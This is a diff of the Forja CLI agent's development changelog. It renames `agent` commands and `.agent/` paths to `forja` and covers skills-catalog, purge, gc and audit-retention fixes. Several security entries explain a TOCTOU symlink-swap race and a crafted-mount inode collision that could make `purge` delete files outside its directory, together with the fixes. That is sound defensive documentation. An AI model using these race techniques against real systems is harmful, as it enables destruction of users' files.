+The last slice. `forja init` now scaffolds a fifth artifact — the seed skill catalog — so a freshly-initialized project starts with 20 vetted skills.
 
 - The 20 seed skills moved from `docs/spec/skills/` (the architect's draft staging) to `src/cli/init-skills/`, their canonical home — bundled into the binary as `with { type: 'text' }` imports, mirroring `init-playbooks/`. `docs/spec/skills/` is removed: seed content lives in `src/cli/init-*`, never `docs/spec/` (there is no `docs/spec/playbooks/` either). One seed (`profile-hotspot`) shipped a 126-char description — trimmed to 111 so the catalog admits it (the 120-char cap, slice 1).
 - **`src/cli/init-skills/index.ts`** (new) — `CANONICAL_SKILLS`, the bundled array.
-- **`init.ts`** — a `skills` step writes the catalog into `<cwd>/.agent/skills/shared/`. The playbooks + skills copy/skip/force loop is extracted into one `scaffoldAssetDir`; `scaffoldPlaybooks` / `scaffoldSkills` are thin wrappers over it.
-- The new step rippled through the drift-guarded surfaces: `args.ts` (`--only` / `--force` step lists) and `purge.ts` (`INIT_MARKERS` — `.agent/skills/` now gates `agent purge` and is recognized by it). The drift-guard tests pairing those to `DEFAULT_STEPS` caught each omission.
-- `memory/gitignore.ts` — `.agent/.gitignore` now ignores `skills/local/` (spec §2: the local scope is gitignored, like `memory/local/`).
-- Forja's own `.agent/skills/shared/` is populated with the 20 skills — its dev sessions now boot with the catalog surfaced in the prompt.
+- **`init.ts`** — a `skills` step writes the catalog into `<cwd>/.forja/skills/shared/`. The playbooks + skills copy/skip/force loop is extracted into one `scaffoldAssetDir`; `scaffoldPlaybooks` / `scaffoldSkills` are thin wrappers over it.
+- The new step rippled through the drift-guarded surfaces: `args.ts` (`--only` / `--force` step lists) and `purge.ts` (`INIT_MARKERS` — `.forja/skills/` now gates `forja purge` and is recognized by it). The drift-guard tests pairing those to `DEFAULT_STEPS` caught each omission.
+- `memory/gitignore.ts` — `.forja/.gitignore` now ignores `skills/local/` (spec §2: the local scope is gitignored, like `memory/local/`).
+- Forja's own `.forja/skills/shared/` is populated with the 20 skills — its dev sessions now boot with the catalog surfaced in the prompt.
 
-`tests/cli/init-skills.test.ts` (new) validates every seed parses + `agent init` installs a catalog all 20 resolve into; `init.test.ts` / `purge.test.ts` updated for the fifth step. `typecheck` + `lint` clean; `tests/cli/` + `tests/memory/` green (the one pre-existing `repl.test.ts` banner failure aside).
+`tests/cli/init-skills.test.ts` (new) validates every seed parses + `forja init` installs a catalog all 20 resolve into; `init.test.ts` / `purge.test.ts` updated for the fifth step. `typecheck` + `lint` clean; `tests/cli/` + `tests/memory/` green (the one pre-existing `repl.test.ts` banner failure aside).
 
-Code-reviewed before close (3-agent pass — reuse / quality / efficiency, max effort; efficiency confirmed the 20 bundled text assets load only in the `agent init` process, never on a normal `agent` boot — type-only + dynamic-gated import). Fixes folded in: `parseCsvSubset` now derives its `valid: …` hint from the step array it is already passed instead of a hand-maintained string copy — that copy had silently kept the pre-skills list, so `agent init --force=typo` advised a valid set without `skills`; the `--force=` / `--only=` empty-value messages and the `--help` text were corrected the same way. Plus the stale `four`→`five` comments the fifth step left behind.
+Code-reviewed before close (3-agent pass — reuse / quality / efficiency, max effort; efficiency confirmed the 20 bundled text assets load only in the `forja init` process, never on a normal `forja` boot — type-only + dynamic-gated import). Fixes folded in: `parseCsvSubset` now derives its `valid: …` hint from the step array it is already passed instead of a hand-maintained string copy — that copy had silently kept the pre-skills list, so `forja init --force=typo` advised a valid set without `skills`; the `--force=` / `--only=` empty-value messages and the `--help` text were corrected the same way. Plus the stale `four`→`five` comments the fifth step left behind.
 
 The skills subsystem (slices 1–7) is feature-complete for v1: storage + scopes, the precedence-resolving catalog, the `skill_events` audit, the `skill_invoke` / `skill_list` / `skill_show` tools, the eager prompt surface, the `/skill` lifecycle command, and the installed seed catalog. `capture` / `import` / the §6.4 decay sweep remain the noted v2 scope.
 
@@ -5678,7 +6982,7 @@ Code-reviewed before close (3-agent pass — reuse / quality / efficiency, max e
 
 `tests/skills/` + `tests/storage/` green (875), `typecheck` + `lint` clean.
 
-Follow-up, NOT slice 3: a retention sweep (`pruneSkillEvents` + `agent gc` wiring) — `skill_events` grows unbounded until then. It is an audit-subsystem change, tracked separately rather than shipped as a dead function here.
+Follow-up, NOT slice 3: a retention sweep (`pruneSkillEvents` + `forja gc` wiring) — `skill_events` grows unbounded until then. It is an audit-subsystem change, tracked separately rather than shipped as a dead function here.
 
 ## [2026-05-21] feat(skills) — slice 2: catalog
 
@@ -5703,14 +7007,14 @@ New subsystem (spec `SKILLS.md`): gated, reusable procedures the model invokes w
 **Slice 1 — `src/skills/{types,frontmatter,paths,loader,index}.ts`.** Pure core storage, no harness coupling:
 
 - `frontmatter.ts` — parse / serialize / validate skill `.md` files. `name` + `description` required (kebab-case name; single-line description hard-capped at the spec's 120 chars); `version` / `trigger_keywords` / `tools` / `requires` / `source` / `created_at` / `updated_at` / `expires` optional. Snake_case field names mirror the YAML keys 1:1 — no case-translation layer. `expires: null` (the seed-catalog idiom) collapses to absent. Unknown fields rejected. Strict `---` fence detection, CRLF normalized, one leading body blank stripped — modeled on `memory/frontmatter.ts`.
-- `paths.ts` — scope roots: user via the shared `config/agent-paths.ts:agentConfigDir` (XDG + Windows `APPDATA`; `null` when no home is derivable, so `SkillScopeRoots.user` is `string | null`), project `.agent/skills/{shared,local}/`. `skillFilePath` validates the name then re-checks the resolved path under the scope root — defense-in-depth, unreachable with the current `NAME_RE`. Repo-root resolution stays the caller's job — no skills→memory coupling.
+- `paths.ts` — scope roots: user via the shared `config/agent-paths.ts:agentConfigDir` (XDG + Windows `APPDATA`; `null` when no home is derivable, so `SkillScopeRoots.user` is `string | null`), project `.forja/skills/{shared,local}/`. `skillFilePath` validates the name then re-checks the resolved path under the scope root — defense-in-depth, unreachable with the current `NAME_RE`. Repo-root resolution stays the caller's job — no skills→memory coupling.
 - `loader.ts` — glob-based discovery (skills have no `MEMORY.md`-style index): `listSkillNames` / `readSkillByName` / `scanScope`. Symlinked + non-regular `.md` files refused — a skill body is injected into model context, so a symlink could exfiltrate an out-of-scope file.
 
 55 tests in `tests/skills/` (frontmatter / paths / loader); `typecheck` + `lint` clean.
 
 Code-reviewed before close (3-agent pass — reuse / quality / efficiency, max effort). Fixes folded in: `userScopeRoot` switched to the shared `config/agent-paths.ts:agentConfigDir` — it was a fourth hand-rolled XDG copy that missed Windows user paths, the exact drift `agent-paths.ts` exists to end (a homeless env now yields no user scope rather than a cwd-relative path; this also makes `ScopeError` reachable + tested); a `SKILL_FIELD_ORDER` tuple replaced three hand-synced field lists (interface / unknown-field gate / serializer); plus comment-honesty and coverage fixes (`source: imported` + `version: null` round-trips, null-scope-root paths). Noted follow-up, NOT slice 1: `checkRegularFile` is byte-identical with `memory/loader.ts` — extracting it to a shared `src/lib/` is a cross-subsystem change (migrates memory too), tracked separately. The skills↔memory frontmatter/sandbox helper duplication is deliberate per-subsystem (error-class coupling; signatures already divergent across 5 subsystems) — left as-is.
 
-Deferred, raised when load-bearing: seed-catalog placement (the 20 `docs/spec/skills/` files → `.agent/skills/shared/`?) at slice 7; branch at first commit. `requires:` is parsed and will surface in `skill_show` but gets no hard pre-flight in v1 — no subsystem-capability registry exists; `tools:` will be registry-checked at slice 4.
+Deferred, raised when load-bearing: seed-catalog placement (the 20 `docs/spec/skills/` files → `.forja/skills/shared/`?) at slice 7; branch at first commit. `requires:` is parsed and will surface in `skill_show` but gets no hard pre-flight in v1 — no subsystem-capability registry exists; `tools:` will be registry-checked at slice 4.
 
 ## [2026-05-21] feat(tui) — restyle the permission modal preview
 
@@ -6031,7 +7335,7 @@ Operator-reported follow-up to commit `22d17e9` (TOCTOU abort fix). That fix cor
 **Concrete scenario:**
 
 ```
-$ agent purge --force --no-audit
+$ forja purge --force --no-audit
 forja purge: FS removal failed mid-walk: EBUSY: resource busy or locked
   (audit row was already written; the project is in a partial state)   ← LIE
 ```
@@ -6064,7 +7368,7 @@ The operator running an incident-recovery purge (DB might be broken — exactly 
 - 44/44 tests in `tests/cli/purge.test.ts` (+2 new pins)
 - typecheck + lint clean
 
-**Pre-existing operator state.** Anyone who hit a generic mid-walk failure under `--no-audit` between commit `22d17e9` and this fix saw the false "audit row was already written" line. No FS damage; just misdirected investigation. The DB has no row for the failed purge attempt (correct behavior under `--no-audit`); re-running `agent purge --dry-run` shows the current state.
+**Pre-existing operator state.** Anyone who hit a generic mid-walk failure under `--no-audit` between commit `22d17e9` and this fix saw the false "audit row was already written" line. No FS damage; just misdirected investigation. The DB has no row for the failed purge attempt (correct behavior under `--no-audit`); re-running `forja purge --dry-run` shows the current state.
 
 ## [2026-05-19] fix(cli) — propagate `[audit]` / `[audit.retention]` config warnings through bootstrap
 
@@ -6089,24 +7393,24 @@ In all four cases the operator's intent was UNDONE silently, while gc continued 
 
 4. **Tests** — 172/172 across 5 files:
     - `tests/cli/bootstrap-memory-defaults.test.ts`: new `bootstrap — auditConfigWarnings propagation` describe with 3 pins — (a) malformed `[audit.retention]` values produce ≥ 3 warnings AND fall back to defaults verified by reading `result.config.auditRetention.*`; (b) typo at `[audit].*` sibling level produces a "not a known audit key" warning AND `runGcOnStop` stays false; (c) clean config produces `[]` (no false positives).
-    - `tests/cli/init-eval.test.ts`: scaffold expectation pin — `auditConfigWarnings` is `[]` after `agent init` (init doesn't scaffold `[audit]`, so loader returns defaults silently).
+    - `tests/cli/init-eval.test.ts`: scaffold expectation pin — `auditConfigWarnings` is `[]` after `forja init` (init doesn't scaffold `[audit]`, so loader returns defaults silently).
     - `tests/cli/repl-history.test.ts`: 2 mock `BootstrapResult` instances updated with `auditConfigWarnings: [] as readonly string[]`.
     - `tests/cli/repl.test.ts`: 1 mock updated.
     - `tests/audit/config-loader.test.ts`: no changes needed — loader already produced warnings; the bug was purely a bootstrap wiring gap.
 
 **Verification:** 172/172 across the 5 impacted test files; typecheck + lint clean.
 
-**Pre-existing operator state.** Installs that ran with any misconfigured `[audit]` / `[audit.retention]` block before this fix would have seen silent default fallback for all of them. To audit your install, re-run with `bun run dev <prompt>` (or `agent` once built) — every previously-silent warning will now surface on stderr with the `forja: audit config:` prefix. If a warning appears, fix the TOML and the intended retention/Stop-hook behavior takes effect on the next boot.
+**Pre-existing operator state.** Installs that ran with any misconfigured `[audit]` / `[audit.retention]` block before this fix would have seen silent default fallback for all of them. To audit your install, re-run with `bun run dev <prompt>` (or `forja` once built) — every previously-silent warning will now surface on stderr with the `forja: audit config:` prefix. If a warning appears, fix the TOML and the intended retention/Stop-hook behavior takes effect on the next boot.
 
-## [2026-05-19] fix(cli) — `agent purge --force` aborts (exit 1) on TOCTOU detection
+## [2026-05-19] fix(cli) — `forja purge --force` aborts (exit 1) on TOCTOU detection
 
-Operator-reported bug. The TOCTOU defense in `walkRemove` previously only emitted a stderr line and `return`-ed from the current frame when `verifySamePostReaddir` reported a concurrent FS swap. That sub-frame return cleanly fell off the call stack: if the failure was at the ROOT `.agent/` directory (which is `removeTree`'s entrypoint), the function returned `{files: 0, dirs: 0, bytes: 0}`, `runPurge` built a `ForceReport` with `removed: {0, 0, 0}`, and rendered SUCCESS (exit 0) — silently violating `--force` semantics. Operators saw "purge succeeded" but the project state was unchanged after a concurrent FS swap/race.
+Operator-reported bug. The TOCTOU defense in `walkRemove` previously only emitted a stderr line and `return`-ed from the current frame when `verifySamePostReaddir` reported a concurrent FS swap. That sub-frame return cleanly fell off the call stack: if the failure was at the ROOT `.forja/` directory (which is `removeTree`'s entrypoint), the function returned `{files: 0, dirs: 0, bytes: 0}`, `runPurge` built a `ForceReport` with `removed: {0, 0, 0}`, and rendered SUCCESS (exit 0) — silently violating `--force` semantics. Operators saw "purge succeeded" but the project state was unchanged after a concurrent FS swap/race.
 
 **Failure shape:**
 
 | TOCTOU location | Pre-fix outcome | Operator-visible signal |
 |---|---|---|
-| Root `.agent/` (first lstat→readdir) | exit 0 + "purge succeeded, removed: 0 files / 0 dirs / 0 B" | stderr line about "refusing to descend" + bogus success |
+| Root `.forja/` (first lstat→readdir) | exit 0 + "purge succeeded, removed: 0 files / 0 dirs / 0 B" | stderr line about "refusing to descend" + bogus success |
 | Mid-tree (child dir) | exit 1, but with `FS removal failed mid-walk: ENOTEMPTY` — because rmdir on the parent failed when the failing-child subtree was still there | Generic message; operator can't tell it was a TOCTOU race vs. perm error vs. EBUSY |
 
 The first case is the silent --force violation. The second case still exits 1 but via a confusing path (rmdir-failure cascading up) with the wrong root cause in the message.
@@ -6142,7 +7446,7 @@ The first case is the silent --force violation. The second case still exits 1 bu
 - 42/42 tests in `tests/cli/purge.test.ts` (was 38, +4 new TOCTOU abort pins)
 - typecheck + lint clean
 
-**Pre-existing operator state.** Installs that hit a root-level TOCTOU race between the previous fix and this one would have seen exit 0 + zero-removal "success" output. The audit row was still written, so `agent --list-sessions` and the purge_events ledger would record an inflated "I purged at <ts>" claim against a project that's actually still intact. Affected operators should re-run `agent purge --dry-run` on suspect projects to see what's still there. No corruption — the FS is genuinely intact.
+**Pre-existing operator state.** Installs that hit a root-level TOCTOU race between the previous fix and this one would have seen exit 0 + zero-removal "success" output. The audit row was still written, so `forja --list-sessions` and the purge_events ledger would record an inflated "I purged at <ts>" claim against a project that's actually still intact. Affected operators should re-run `forja purge --dry-run` on suspect projects to see what's still there. No corruption — the FS is genuinely intact.
 
 ## [2026-05-19] feat(audit) — gc Phase 3 wires `purge_events` retention (inert key bug)
 
@@ -6150,9 +7454,9 @@ Operator-reported gap. The purge subsystem migration (066-purge-events.ts:87) de
 
 **Consequences.**
 
-- `purge_events` rows grow unbounded across the install lifetime. Each `agent purge --force` adds 1 row (`bytes_present`, `files_present`, `dirs_present`, plus JSON artifact list). Heavy users with frequent purges accumulate without ever triggering the documented 365d sweep.
+- `purge_events` rows grow unbounded across the install lifetime. Each `forja purge --force` adds 1 row (`bytes_present`, `files_present`, `dirs_present`, plus JSON artifact list). Heavy users with frequent purges accumulate without ever triggering the documented 365d sweep.
 - The documented retention behavior in AUDIT.md §1.2 + the migration comment didn't hold: operators reading either source assumed the sweep was wired, but it wasn't.
-- `agent gc --table=purge_events` would have rejected (unknown table) — no way to even manually sweep through the CLI.
+- `forja gc --table=purge_events` would have rejected (unknown table) — no way to even manually sweep through the CLI.
 - The "inert key" pattern was operator-visible only by reading source: typing the key in TOML produced no warning, no effect, no signal of either acceptance or rejection.
 
 **Fix.** Wire `purge_events` end-to-end through the gc subsystem as the first inhabitant of a new "Phase 3" category:
@@ -6180,9 +7484,9 @@ Operator-reported gap. The purge subsystem migration (066-purge-events.ts:87) de
 
 - **Schema key order in `KNOWN_SCHEMA_KEYS` reordered to reflect new validation status.** `purge_events` moved out of the "accepted, ignored" block into a new "Phase 3 (validated + applied)" block. The remaining "Phase 4+" entries (`sessions`, `messages`, `approvals`, `approvals_log`, `policies`, `pending_decisions`, `prompt_versions`, `default_days`) stay forward-compat — none of those have an active sweep path yet.
 
-**Pre-existing operator state.** Installs that ran `agent purge --force` since migration 066 landed will have accumulated `purge_events` rows that were never swept. The first `agent gc --force` after this fix lands will retroactively delete any rows older than 365d. Operators expecting no rows to disappear should set a temporary larger retention before running gc, OR run `agent gc --table=purge_events` in dry-run first to see the projected delete count.
+**Pre-existing operator state.** Installs that ran `forja purge --force` since migration 066 landed will have accumulated `purge_events` rows that were never swept. The first `forja gc --force` after this fix lands will retroactively delete any rows older than 365d. Operators expecting no rows to disappear should set a temporary larger retention before running gc, OR run `forja gc --table=purge_events` in dry-run first to see the projected delete count.
 
-## [2026-05-19] fix(cli) — `agent gc` dry-run discriminates ENOENT from other stat errors
+## [2026-05-19] fix(cli) — `forja gc` dry-run discriminates ENOENT from other stat errors
 
 Operator-reported follow-up to commit `7c5cd95`. The ENOENT-vs-real-failure fix used `existsSync(dbPath)` to discriminate, but `existsSync` swallows ALL stat errors and returns `false` for ENOENT, EACCES, ENOTDIR, ELOOP, ENAMETOOLONG equally. The discrimination was only HALF right: real ENOENT (file truly absent) downgraded to exit 0 — but so did EACCES (parent perm denied), ENOTDIR (parent isn't a directory), and other path-resolution errors. Same silent-masking bug the prior fix was meant to close.
 
@@ -6196,7 +7500,7 @@ Operator-reported follow-up to commit `7c5cd95`. The ENOENT-vs-real-failure fix 
 | Symlink cycle (ELOOP) | false | exit 0 + "fresh install" silently | exit 1 |
 | Path too long (ENAMETOOLONG) | false | exit 0 + "fresh install" silently | exit 1 |
 
-Cron jobs and CI scripts running `agent gc --json` against misconfigured paths would see "all good, 0 rows to sweep" instead of the actual operational failure.
+Cron jobs and CI scripts running `forja gc --json` against misconfigured paths would see "all good, 0 rows to sweep" instead of the actual operational failure.
 
 **Fix.** Replace `existsSync` with `lstatSync` + explicit `err.code === 'ENOENT'` check. Three discriminated cases:
 
@@ -6240,7 +7544,7 @@ The previously-existing ENOENT pin still passes (true missing file path).
 
 Operator-reported bug. The gc Phase 2 refactor (`4ee6de0`) replaced `args.ts`'s import of `PHASE_1_TABLES` (4-element array) with `GC_TABLES` from `audit/gc.ts`. But `audit/gc.ts` is the orchestrator — it imports every gc-covered table's prune helper, which transitively pulls the entire storage/memory graph (e.g., `eviction-events.ts` → `memory/scanner.ts`).
 
-**Concrete failure mode.** `src/cli/args.ts` is loaded by EVERY agent invocation — `agent`, `agent --help`, `agent --version`, `agent <prompt>`. After the refactor, that means the storage repos chain is also loaded at module-graph-resolution time for ALL of those. If any deep dep is unavailable (broken native binding, partial install, missing peer dep, FS issue during install), even `agent --help` fails before reaching the dispatcher. The CLI's lazy-import posture in `cli/index.ts` (runtime handlers like `run.ts`, `purge.ts`, `gc.ts` are all `await import(...)`-loaded INSIDE `main()`) becomes fragile because args.ts pre-loads what those handlers were supposed to defer.
+**Concrete failure mode.** `src/cli/args.ts` is loaded by EVERY agent invocation — `forja`, `forja --help`, `forja --version`, `agent <prompt>`. After the refactor, that means the storage repos chain is also loaded at module-graph-resolution time for ALL of those. If any deep dep is unavailable (broken native binding, partial install, missing peer dep, FS issue during install), even `forja --help` fails before reaching the dispatcher. The CLI's lazy-import posture in `cli/index.ts` (runtime handlers like `run.ts`, `purge.ts`, `gc.ts` are all `await import(...)`-loaded INSIDE `main()`) becomes fragile because args.ts pre-loads what those handlers were supposed to defer.
 
 The original `PHASE_1_TABLES` import worked because the symbol was already in args.ts's own subsystem (we kept the source of truth in audit/gc.ts but did NOT pull storage repos eagerly). The Phase 2 commit "fixed" the drift-guard by deriving from `GC_TABLES`, but the cure brought a worse coupling.
 
@@ -6271,9 +7575,9 @@ Static source checks (not runtime). Simulating "storage dep missing" at runtime 
 - 16/16 args-gc tests pass (was 13, +3 new pins)
 - 238/238 across args + args-gc + audit + gc CLI
 - typecheck + lint clean
-- Smoke E2E: `agent --version` → `0.0.0`; `agent --help` → usage banner. Both load cleanly without dragging storage/memory chain.
+- Smoke E2E: `forja --version` → `0.0.0`; `forja --help` → usage banner. Both load cleanly without dragging storage/memory chain.
 
-**Pre-existing operator state.** Operators with broken storage deps (rare but reported by partial-install scenarios) couldn't even run `agent --help` before this fix to diagnose. After this fix, lightweight commands work regardless of storage state, restoring the CLI's "help/version always work" contract.
+**Pre-existing operator state.** Operators with broken storage deps (rare but reported by partial-install scenarios) couldn't even run `forja --help` before this fix to diagnose. After this fix, lightweight commands work regardless of storage state, restoring the CLI's "help/version always work" contract.
 
 ## [2026-05-19] fix(storage + bootstrap) — wire `[audit.retention].recap_cache` into write path
 
@@ -6314,13 +7618,13 @@ The setter approach is the minimum-invasive fix; tests reset the override in `af
 - 116/116 across recap-cache + bootstrap + audit
 - typecheck + lint clean (Biome auto-fix for one formatting nit in bootstrap)
 
-**Pre-existing operator state.** Operators who set non-default `recap_cache` config before this fix had their setting silently ignored — writes used 1h regardless. After this fix, the next bootstrap (any agent command) picks up the config and subsequent writes honor it. Pre-existing rows in `recap_cache` already have their `expires_at` written under the old (1h) regime; they survive until the existing TTL elapses. Operator who wants the new TTL to apply retroactively can `agent gc --force --table=recap_cache` (which uses the canonical `<=` sweep predicate; doesn't depend on the config TTL).
+**Pre-existing operator state.** Operators who set non-default `recap_cache` config before this fix had their setting silently ignored — writes used 1h regardless. After this fix, the next bootstrap (any agent command) picks up the config and subsequent writes honor it. Pre-existing rows in `recap_cache` already have their `expires_at` written under the old (1h) regime; they survive until the existing TTL elapses. Operator who wants the new TTL to apply retroactively can `forja gc --force --table=recap_cache` (which uses the canonical `<=` sweep predicate; doesn't depend on the config TTL).
 
-## [2026-05-19] fix(cli) — `agent purge` TOCTOU verifier checks `dev` alongside `ino`
+## [2026-05-19] fix(cli) — `forja purge` TOCTOU verifier checks `dev` alongside `ino`
 
 Operator-reported security follow-up to commit `75779ce` (TOCTOU symlink race fix). The `verifySamePostReaddir` detector compared only `stAfter.ino === preStat.ino` to confirm directory identity after `readdirSync`. Inode numbers are **only unique per filesystem** — a cross-device swap (adversary mounting a crafted FS at the path with a directory whose ino collides with the original) would pass the check and let the walker recurse into the swapped tree.
 
-**Attack shape.** Adversary with mount privileges (or via FUSE / user namespaces in some configurations) mounts a tmpfs / crafted ext4 at the dir's path between `lstatSync` and `readdirSync`. Crafts the directory inode value to match the original (trivial: SQLite/tmpfs let you control ino at creation in some cases, or just try until you hit a collision — small ino space). The post-readdir re-stat returns the SAME ino — verifier passes. Walker recurses into the mount's contents — deletes files outside `.agent/`.
+**Attack shape.** Adversary with mount privileges (or via FUSE / user namespaces in some configurations) mounts a tmpfs / crafted ext4 at the dir's path between `lstatSync` and `readdirSync`. Crafts the directory inode value to match the original (trivial: SQLite/tmpfs let you control ino at creation in some cases, or just try until you hit a collision — small ino space). The post-readdir re-stat returns the SAME ino — verifier passes. Walker recurses into the mount's contents — deletes files outside `.forja/`.
 
 Real-world feasibility: requires mount rights OR FUSE setup. Lower than the basic symlink race but still within the operator's threat model (multi-user host, container escape recovery, hostile sysadmin scenarios).
 
@@ -6351,15 +7655,15 @@ Real cross-device mount isn't feasible in a unit test (needs root + loop device 
 
 **Pre-existing operator state.** Same as the original TOCTOU fix — only triggers under concurrent FS modification by a malicious local process with mount rights. Normal single-process workflows were never affected. This fix tightens the identity check; an adversary winning the residual post-stat race remains the only theoretical hole, deferred until exploit reported.
 
-## [2026-05-19] fix(cli) — `agent gc` distinguishes missing DB from real failures in dry-run
+## [2026-05-19] fix(cli) — `forja gc` distinguishes missing DB from real failures in dry-run
 
 Operator-reported bug. The dry-run readonly-open fix (commit `706b344`) collapsed ALL open failures into "fresh install case" — empty report, exit 0, stderr warning. Concrete consequence: a corrupted DB, perm-denied DB, locked DB, or integrity-check failure would surface as "all good, 0 rows to sweep" to scripts/cron jobs, masking real operational failures.
 
-**Concrete failure mode.** Operator's `~/.local/share/forja/sessions.db` is corrupted (cosmic ray, torn page after kernel crash, hostile FS write). Cron job runs `agent gc --json` nightly. Pre-fix:
+**Concrete failure mode.** Operator's `~/.local/share/forja/sessions.db` is corrupted (cosmic ray, torn page after kernel crash, hostile FS write). Cron job runs `forja gc --json` nightly. Pre-fix:
 ```
-{"mode":"dry-run","tables":[],"errors":[],"command":"agent gc --force"}
+{"mode":"dry-run","tables":[],"errors":[],"command":"forja gc --force"}
 ```
-Exit 0. Cron silently thinks hygiene is healthy. Operator never notices the DB is broken until something else (a normal `agent` session) hits the corruption.
+Exit 0. Cron silently thinks hygiene is healthy. Operator never notices the DB is broken until something else (a normal `forja` session) hits the corruption.
 
 Post-fix:
 ```
@@ -6393,11 +7697,11 @@ All four cases produce sane behavior.
 - typecheck + lint clean
 - Smoke E2E: corrupt sessions.db at real `defaultDbPath()` path → `exit 1` + stderr "file is not a database"; missing path → `exit 0` + fresh-install message.
 
-**Pre-existing operator state.** Operators with corrupted DBs who relied on cron-driven `agent gc --json` checks may have missed the corruption. The fix surfaces it on next run; recovery is the same as any DB corruption (restore from backup, rotate via `agent permission rotate-chain`, or `rm` and start fresh if no audit history is needed). No automated migration — this fix CATCHES the regression, doesn't repair existing damage.
+**Pre-existing operator state.** Operators with corrupted DBs who relied on cron-driven `forja gc --json` checks may have missed the corruption. The fix surfaces it on next run; recovery is the same as any DB corruption (restore from backup, rotate via `forja permission rotate-chain`, or `rm` and start fresh if no audit history is needed). No automated migration — this fix CATCHES the regression, doesn't repair existing damage.
 
-## [2026-05-19] fix(cli) — `agent purge` TOCTOU symlink race in removeTree
+## [2026-05-19] fix(cli) — `forja purge` TOCTOU symlink race in removeTree
 
-Operator-reported **security** bug. The purge walker's symlink defense was load-bearing for the "won't delete files outside `.agent/`" contract in spec §2.1.2, but had a TOCTOU window that defeated it under concurrent FS mutation.
+Operator-reported **security** bug. The purge walker's symlink defense was load-bearing for the "won't delete files outside `.forja/`" contract in spec §2.1.2, but had a TOCTOU window that defeated it under concurrent FS mutation.
 
 **The race:**
 
@@ -6406,12 +7710,12 @@ t0: lstatSync(path)        → directory D, inode X
 t1: ADVERSARY swaps        → path is now a symlink S → /home/important/
 t2: readdirSync(path)      → follows symlink → lists /home/important/'s entries
 t3: walkRemove(child)      → recurses into /home/important/<child>
-... deletes files outside .agent/
+... deletes files outside .forja/
 ```
 
-The top-of-walk symlink check on `<repoRoot>/.agent/` itself didn't help — the race was per-directory inside the walk, on every recursive descent. Any concurrent process with FS write access to a path inside `.agent/` could exploit it during the narrow window between `lstatSync` and `readdirSync`.
+The top-of-walk symlink check on `<repoRoot>/.forja/` itself didn't help — the race was per-directory inside the walk, on every recursive descent. Any concurrent process with FS write access to a path inside `.forja/` could exploit it during the narrow window between `lstatSync` and `readdirSync`.
 
-Real-world attack feasibility: low (requires concurrent access + tight timing + write rights inside `.agent/`), but the spec promised the symlink defense was absolute; this was a documented contract violation, not just a theoretical risk.
+Real-world attack feasibility: low (requires concurrent access + tight timing + write rights inside `.forja/`), but the spec promised the symlink defense was absolute; this was a documented contract violation, not just a theoretical risk.
 
 **Fix.** New exported helper `verifySamePostReaddir(path, preStat): boolean` — re-runs `lstatSync` AFTER `readdirSync` and verifies the path still points at the same inode of a real directory. If the post-stat shows a symlink, a different inode, a non-directory, or vanished — return false and the walker refuses to recurse.
 
@@ -6449,13 +7753,13 @@ Race scheduling can't be reproduced deterministically without flaky timing tests
 
 **Pre-existing operator state.** No automated recovery — the bug only triggers under concurrent FS modification by a malicious local process. Operators in normal single-process workflows were never affected. The fix shrinks the attack window; an adversary winning the residual race is the remaining theoretical risk, deferred per above.
 
-## [2026-05-19] fix(cli) — `agent purge` dry-run suggestion preserves `--no-audit`
+## [2026-05-19] fix(cli) — `forja purge` dry-run suggestion preserves `--no-audit`
 
-Operator-safety bug, same shape as the recent gc `--table` scope fix. Dry-run output (both human "To execute:" line AND JSON `command` field) was hardcoded to `agent purge --force`, regardless of whether the operator passed `--no-audit`.
+Operator-safety bug, same shape as the recent gc `--table` scope fix. Dry-run output (both human "To execute:" line AND JSON `command` field) was hardcoded to `forja purge --force`, regardless of whether the operator passed `--no-audit`.
 
 **Concrete failure mode (motivating scenario).** Operator hits a DB corruption / fresh install / recovery situation where the global `sessions.db` is unwritable. They:
-1. Run `agent purge --no-audit` to inspect what would be removed.
-2. Dry-run shows scope + suggests `agent purge --force`.
+1. Run `forja purge --no-audit` to inspect what would be removed.
+2. Dry-run shows scope + suggests `forja purge --force`.
 3. Copy-paste the suggestion.
 4. Force run hits the audit gate (DB unwritable, no `--no-audit` to bypass) → aborts with "cannot write audit row to DB; pass --no-audit to bypass".
 5. Operator now stuck in a loop: they have to manually remember the flag they originally used.
@@ -6464,41 +7768,41 @@ The `--no-audit` flag exists exactly for the emergency case where the DB is brok
 
 **Fix.** Build the suggested command dynamically:
 ```ts
-const command = noAudit ? 'agent purge --force --no-audit' : 'agent purge --force';
+const command = noAudit ? 'forja purge --force --no-audit' : 'forja purge --force';
 ```
 Passed into the `DryRunReport.command` field, surfaces in both the human "To execute:" line and JSON output. Force-mode JSON still omits `command` (no follow-up to suggest).
 
 Mirrors the gc Phase 2 `buildForceCommand(tables)` fix — same principle (suggested command must echo operator's flags so copy-paste is executable).
 
 **Tests.** 4 new pins in `tests/cli/purge.test.ts` describe `runPurge — dry-run suggestion preserves --no-audit`:
-- `no --no-audit → "agent purge --force" (baseline)` — bare suggestion still works.
+- `no --no-audit → "forja purge --force" (baseline)` — bare suggestion still works.
 - `--no-audit set → suggestion preserves the flag` — JSON output check.
-- `human output echoes --no-audit suggestion` — includes negative polarity assertion (`stdout NOT matching /agent purge --force\n/` to catch regression).
+- `human output echoes --no-audit suggestion` — includes negative polarity assertion (`stdout NOT matching /forja purge --force\n/` to catch regression).
 - `--no-audit + unwritable DB → suggestion still executable` — the motivating scenario itself: probe-skipped + blocker dbPath, suggestion still includes `--no-audit` so copy-paste actually works.
 
 **Verification:**
 - 32/32 purge tests pass (was 28, +4 new pins)
 - 43/43 across purge + args-purge
 - typecheck + lint clean
-- Smoke E2E: `agent purge --no-audit` in fresh tempdir with valid `.agent/` → "To execute:" footer shows `agent purge --force --no-audit`.
+- Smoke E2E: `forja purge --no-audit` in fresh tempdir with valid `.forja/` → "To execute:" footer shows `forja purge --force --no-audit`.
 
 **Pre-existing operator state.** Operators who copy-pasted the bare suggestion from a `--no-audit` dry-run before this fix may have hit the audit gate and either aborted (no data lost — just frustrating) or manually added `--no-audit` on retry. No automated recovery needed.
 
-## [2026-05-19] fix(cli) — `agent gc` dry-run suggestion preserves `--table` scope
+## [2026-05-19] fix(cli) — `forja gc` dry-run suggestion preserves `--table` scope
 
-Operator-safety bug. Dry-run output (both human "To execute: agent gc --force" line AND JSON `command` field) was hardcoded to `agent gc --force` — no `--table=X` flags echoed back.
+Operator-safety bug. Dry-run output (both human "To execute: forja gc --force" line AND JSON `command` field) was hardcoded to `forja gc --force` — no `--table=X` flags echoed back.
 
 **Concrete failure mode.** Operator:
-1. Runs `agent gc --table=memory_events` to inspect ONLY one table's deletion impact.
